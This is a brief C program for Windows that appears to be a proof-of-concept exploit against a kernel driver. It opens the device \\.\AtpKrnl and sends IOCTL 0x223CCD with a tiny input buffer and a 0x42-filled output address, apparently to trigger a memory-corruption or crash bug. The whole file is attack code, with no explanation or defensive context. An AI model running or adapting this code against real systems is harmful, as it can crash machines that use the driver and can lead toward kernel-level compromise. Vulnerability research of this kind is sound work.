#include <windows.h>
#include <stdio.h>
HANDLE hDriver;
DWORD dw;
LPVOID lpFakeBuffer;
LPVOID Address;

int main() {
	 hDriver = CreateFileA("\\\\.\\AtpKrnl", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	 lpFakeBuffer = malloc(10000); 
	memset(lpFakeBuffer, 0x0, 10000);
	 Address = malloc(10000); 
	memset(Address, 0x42, 10000);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		getchar();
		return -1;
	}

	DeviceIoControl(hDriver, 0x223CCD, lpFakeBuffer, 4, (PVOID)Address, 0, &dw, NULL);
	return 0;
}
